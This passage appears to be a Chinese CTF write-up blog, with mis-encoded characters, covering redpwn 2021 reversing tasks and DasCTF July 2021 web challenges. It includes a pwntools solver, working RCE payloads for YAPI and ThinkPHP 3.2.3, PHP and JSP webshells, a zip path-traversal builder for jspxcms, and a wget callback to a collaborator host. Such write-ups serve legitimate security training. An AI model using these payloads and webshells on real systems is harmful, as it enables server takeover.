&lt;p>ä¸ºäº†decodeé¦–å…ˆéœ€è¦æ ¹æ®Næ±‚å‡ºä¸¤ä¸ªäº’è´¨çš„på’Œqï¼Œå¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™æ¥åš &lt;a href="https://zh.numberempire.com/numberfactorizer.php">æ•´æ•°åˆ†è§£å·¥å…·&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172732092.png" alt="image-20210716172732092">&lt;/p>
&lt;p>ä¹‹åŽå°±å¯ä»¥æ„‰å¿«çš„è§£å¯†äº†ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172627393.png" alt="image-20210716172627393">&lt;/p>
&lt;h2 id="revwstrings">rev/wstrings&lt;/h2>
&lt;blockquote>
&lt;p>Some strings are wider than normal&amp;hellip;&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/c3c2ce7829ac7fb904ab02de13b4fbdda69232159c7a5dfa6d7d0fa37606a45d/wstrings">wstrings&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808184746679.png" alt="image-20210808184746679">&lt;/p>
&lt;p>&lt;code>flag{n0t_al1_str1ngs_ar3_sk1nny}&lt;/code>&lt;/p>
&lt;h2 id="revbread-making">rev/bread-making&lt;/h2>
&lt;blockquote>
&lt;p>My parents aren&amp;rsquo;t home! Quick, help me make some bread please&amp;hellip; &lt;code>nc mc.ax 31796&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/9eee9f077b941e88e1fe75d404582d4f286d9c74729f3ad0d1bb44a527579af8/bread">bread&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png" alt="image-20210710154321719">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md">wp2&lt;/a> &lt;a href="https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making">wp3&lt;/a> &lt;a href="https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713">wp4&lt;/a>&lt;/p>
&lt;p>æˆ‘å½“æ—¶çš„æ€è·¯å’Œæƒ³æ³•å¤§è‡´è¿˜æ˜¯å¯¹çš„ï¼Œ~~ï¼ˆè™½ç„¶æ²¡æœ‰åšå‡ºæ¥å§ï¼‰~~è¿™ä¸ªå°±æ˜¯å…ˆæå–å‡ºæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œç„¶åŽç”¨é€»è¾‘ åœ¨äº¤äº’æ¨¡å¼ä¸‹ç”¨æ­£ç¡®çš„é¡ºåºè¾“å…¥ å®Œæ•´çš„é¡ºä¸‹æ¥è¿™ä¸ªæµç¨‹ï¼Œæœ€åŽæ‹¿åˆ°flagï¼Œæœ€åŽçš„æ­£ç¡®é¡ºåºæ˜¯è¿™æ ·çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>add ingredients to the bowl
add flour
add yeast
add salt
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
unplug the fire alarm
open the window
unplug the oven
clean the counters
flush the bread down the toilet
wash the sink
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png" alt="image-20210716181440958">&lt;/p>
&lt;p>The flag is: &lt;code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}&lt;/code>&lt;/p>
&lt;p>è°ƒè¯•çš„è¿‡ç¨‹æ˜¯linuxä¸‹çš„pyè„šæœ¬&lt;/p>
&lt;pre tabindex="0">&lt;code>from pwn import *
p = remote(&amp;quot;mc.ax&amp;quot;, 31796)
p.sendlineafter(&amp;quot;bowl&amp;quot;, &amp;quot;add flour&amp;quot;)
p.sendlineafter(&amp;quot;flour has been added&amp;quot;, &amp;quot;add yeast&amp;quot;)
p.sendlineafter(&amp;quot;yeast has been added&amp;quot;, &amp;quot;add salt&amp;quot;)
p.sendlineafter(&amp;quot;salt has been added&amp;quot;, &amp;quot;add water&amp;quot;)
p.sendlineafter(&amp;quot;lumpy dough&amp;quot;, &amp;quot;hide the bowl inside a box&amp;quot;)
p.sendlineafter(&amp;quot;to rise&amp;quot;, &amp;quot;wait 3 hours&amp;quot;)
p.sendlineafter(&amp;quot;finish the dough&amp;quot;, &amp;quot;work in the basement&amp;quot;)
p.sendlineafter(&amp;quot;needs to be baked&amp;quot;, &amp;quot;preheat the toaster oven&amp;quot;)
p.sendlineafter(&amp;quot;for 45 minutes&amp;quot;, &amp;quot;set a timer on your phone&amp;quot;)
p.sendlineafter(&amp;quot;awfully long time&amp;quot;, &amp;quot;watch the bread bake&amp;quot;)
p.sendlineafter(&amp;quot;no time to waste&amp;quot;, &amp;quot;pull the tray out with a towel&amp;quot;)
p.sendlineafter(&amp;quot;smoke in the air&amp;quot;, &amp;quot;unplug the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;in another room&amp;quot;, &amp;quot;open the window&amp;quot;)
p.sendlineafter(&amp;quot;air rushes in&amp;quot;, &amp;quot;unplug the oven&amp;quot;)
p.sendlineafter(&amp;quot;kitchen is a mess&amp;quot;, &amp;quot;wash the sink&amp;quot;)
p.sendlineafter(&amp;quot;sink is cleaned&amp;quot;, &amp;quot;clean the counters&amp;quot;)
p.sendlineafter(&amp;quot;counters are cleaned&amp;quot;, &amp;quot;flush the bread down the toilet&amp;quot;)
p.sendlineafter(&amp;quot;is disposed of&amp;quot;, &amp;quot;get ready to sleep&amp;quot;)
p.sendlineafter(&amp;quot;go to sleep&amp;quot;, &amp;quot;close the window&amp;quot;)
p.sendlineafter(&amp;quot;window is closed&amp;quot;, &amp;quot;replace the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;alarm is replaced&amp;quot;, &amp;quot;brush teeth and go to bed&amp;quot;)
p.interactive()
p.close()
&lt;/code>&lt;/pre>&lt;p>è¿™ä¸ªè„šæœ¬çš„é€»è¾‘æ˜¯é€šè¿‡breadæ–‡ä»¶å¯¼å‡ºçš„æ–‡æœ¬ï¼Œæ‰¾å‡ºæœ€ç¬¦åˆé€»è¾‘çš„ä¸Šä¸‹æ–‡ ç„¶åŽåˆ©ç”¨sendlineaferæ¥è§£é¢˜ï¼›å®žé™…åšé¢˜çš„è¯ä¸å¯èƒ½åªé æ‰“å­—æ¥è¯•è¿™ä¸ªé¡ºåº ä¸æ˜¯è¯´è¯•è¿™ä¸ªæµªè´¹æ—¶é—´ è€Œæ˜¯ç­‰å¾…çš„æ—¶é—´éžå¸¸éžå¸¸çŸ­æš‚ æ²¡æœ‰å®Œæ•´æ‰“å®Œå­—çš„æ—¶é—´&lt;/p>
&lt;h2 id="åŽè®°">åŽè®°&lt;/h2>
&lt;p>è¿™æ¬¡çš„redpwnæœ‰47é“é¢˜ï¼Œå„ä¸ªæ–¹å‘éƒ½æœ‰é€‚åˆæˆ‘è¿™ç§ç­¾åˆ°é€‰æ‰‹çš„ç®€å•é¢˜ï¼Œå¥½è¯„~&lt;/p>
&lt;p>å°±æ˜¯æ‰“æ˜Ÿå·çš„é¢˜æ¶‰åŠåˆ°çš„jsåŽŸåž‹æ±¡æŸ“é—®é¢˜ï¼Œå…‰é è¿™ä¸€ä¸¤ä¸ªé¢˜æžä¸å¤ªæ‡‚ï¼Œä½†æ˜¯æœ€è¿‘çš„ååºåˆ—åŒ–é—®é¢˜è¿˜æ²¡æ€»ç»“å®Œï¼Œä¸‰å¿ƒäºŒæ„çš„ä¹Ÿä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹‹åŽä¸€å®šä¼šå›žæ¥çœ‹çš„ï¼ï¼ï¼ç­‰ç€è¢«éž­å°¸å§ å“¼&lt;/p></description></item><item><title>DasCTF0721 Wp</title><link>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</link><pubDate>Thu, 05 Aug 2021 23:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</guid><description>&lt;h2 id="cat-flag">cat flag&lt;/h2>
&lt;blockquote>
&lt;p>ç®€ç®€å•å•cat flag&lt;/p>
&lt;p>Hint: ç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡ï¼Œå…ˆ&lt;code>cat /var/log/nginx/access.log&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802142131657.png" alt="image-20210802142131657">&lt;/p>
&lt;p>ä¹‹åŽç”¨&lt;code>%fa&lt;/code>ç»•è¿‡ &lt;code>/?cmd=this_is_final_fl%faag_e2a457126032b42d.php&lt;/code>&lt;/p>
&lt;p>review - &lt;strong>Nginx é‡è¦æ–‡ä»¶ç›®å½•ï¼š&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx&lt;/li>
&lt;li>ä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf&lt;/li>
&lt;li>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service&lt;/li>
&lt;li>æ¨¡å—ï¼š/usr/lisb64/nginx/modules&lt;/li>
&lt;li>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx&lt;/li>
&lt;li>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html&lt;/li>
&lt;li>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx/access.log&lt;/li>
&lt;/ul>
&lt;h2 id="ezrce">ezrce&lt;/h2>
&lt;blockquote>
&lt;p>ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ&lt;/p>
&lt;/blockquote>
&lt;p>æ˜¯ä¸€ä¸ªYAPIçš„ä¸»é¡µï¼Œæ ¹æ®é¢˜ç›®é‡Œrceçš„æç¤º æœæœçœ‹å·²çŸ¥çš„æ¼æ´žï¼š&lt;a href="https://blog.csdn.net/XavierDarkness/article/details/118662886">Yapi å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž&lt;/a>&lt;/p>
&lt;p>é‚£å°±å¥½åŠžäº† è·Ÿç€æ¥å°±è¡Œå’¯ï¼›é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731153231688.png" alt="image-20210731153231688">&lt;/p>
&lt;p>ä¹‹åŽä¿®æ”¹å…¨å±€mockè„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">mockjson&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;command&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹åŽæ·»åŠ æŽ¥å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154705721.png" alt="image-20210731154705721">&lt;/p>
&lt;p>è„šæœ¬ä¸­çš„execSync()å¤„å¯rceï¼Œå…ˆç”¨&lt;code>wget http://xxxxx.burpcollaborator.net&lt;/code>è¯•è¯•æ°´&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154732738.png" alt="image-20210731154732738">&lt;/p>
&lt;p>å¾ˆé¡ºåˆ©å˜› å¥½è€¶ï¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // spawnSync /bin/sh ENOBUFS
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // config.json, init.lock, log, vendors
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var
&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat ffffffflllllaggggg&lt;span style="color:#d88200">`&lt;/span> // flag&lt;span style="color:#f92672">{&lt;/span>5d096f4f-8c32-49b6-bed4-b485eb1cf08b&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easythinkphp">easythinkphp&lt;/h2>
&lt;blockquote>
&lt;p>easythinkphp&lt;/p>
&lt;/blockquote>
&lt;p>åªæœ‰ä¸€ä¸ªthinkphp 3.2.3çš„æ¬¢è¿Žé¡µé¢ï¼Œtpçš„æ´žå¾ˆå¤š å¯ä»¥ç›´æŽ¥æ‹¿æ¥æ‰“ï¼Œå‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">ã€æ¼æ´žé€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´žé€šæŠ¥&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
/index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
&lt;p>å…ˆéªŒè¯ä¸€ä¸‹æ–‡æ¡£ä¸­çš„æ–¹æ³•ï¼ŒæˆåŠŸï¼Œä¹‹åŽæŠŠphpinfoæ¢æˆè‡ªå·±çš„ä¸€å¥è¯æœ¨é©¬&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¼ å…¥åŽ ç”¨èšå‰‘è¿žæŽ¥å°±èƒ½æ‹¿flagäº†~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
&lt;p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æŽ¥ä½¿ç”¨&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>ä¸€æŠŠæ¢­ï¼ä¸€é”®getshell ä½ å€¼å¾—æ‹¥æœ‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803170035307.png" alt="image-20210803170035307">&lt;/p>
&lt;h2 id="jspxcms">jspxcms&lt;/h2>
&lt;p>ä¹Ÿæœ‰çŽ°æˆçš„æ´žå¯ä»¥ç›´æŽ¥ç”¨ï¼Œå‚è€ƒï¼š&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">å¤çŽ°jspxcmsè§£åŽ‹getshellæ¼æ´ž&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">ä»£ç å®¡è®¡| Jspxcmsæ–‡ä»¶ä¸Šä¼ æ¼æ´ž(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">è®°ä¸€æ¬¡ç”±è¿½è¸ªæº¯æºå‘çŽ°çš„â€œä¸å®‰å…¨è§£åŽ‹getshellâ€&lt;/a>&lt;/p>
&lt;p>é¦–å…ˆæž„é€ å«jspðŸŽçš„æ¶æ„waråŒ…ï¼ŒðŸŽé•¿è¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);
while((a=in.read(b))!=-1){
out.println(new String(b));
}
out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
}
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¹‹åŽæ”¾å…¥ä¸€ä¸ªè§£åŽ‹åŽä¼šè‡ªåŠ¨å®Œæˆç›®å½•ç©¿è¶Šçš„zipåŒ…ä¸­ è¿™ä¸ªè¿‡ç¨‹ç”±pyè„šæœ¬å®Œæˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">binary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;helloworld&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipInfo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../../../dog123.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">binary&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">IOError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test123.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../../../../wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ æœ€ç»ˆæˆ‘ä»¬è¦ç©¿è¶Šåˆ°çš„ç›®å½•æ˜¯ç½‘ç«™æ ¹ç›®å½•çš„ä¸Šå±‚ï¼Œå³webappsç›®å½•ä¸‹ ä¸ŽROOTç›®å½•åŒçº§ï¼Œå½“waråŒ…ä½äºŽè¿™ä¸ªç›®å½•ä¸‹æ‰ä¼šè‡ªåŠ¨éƒ¨ç½²&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801013622428.png" alt="image-20210801013622428">&lt;/p>
&lt;p>ç›´æŽ¥&lt;code>cat /flag&lt;/code>å°±å¥½å•¦&lt;/p>
&lt;h2 id="cybercms">cybercms&lt;/h2>
&lt;blockquote>
&lt;p>èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ&lt;/p>
&lt;p>Hintï¼šä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½&lt;/p>
&lt;/blockquote>
&lt;p>ä¸€ä¸ªï¼ˆä¼ªï¼‰cmså¹³å°ä»‹ç»çš„é¡µé¢ï¼Œæ¯”è¾ƒç®€é™‹ï¼Œé¦–é¡µ/åº”ç”¨æ¡ˆä¾‹å¤„æ˜¾ç¤ºhacked by ymnhï¼Œåœ¨ymnhçš„å’¨è¯¢é¡µé¢å¤„æœ‰è¿™æ ·çš„æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031306740.png" alt="image-20210801031306740">&lt;/p>
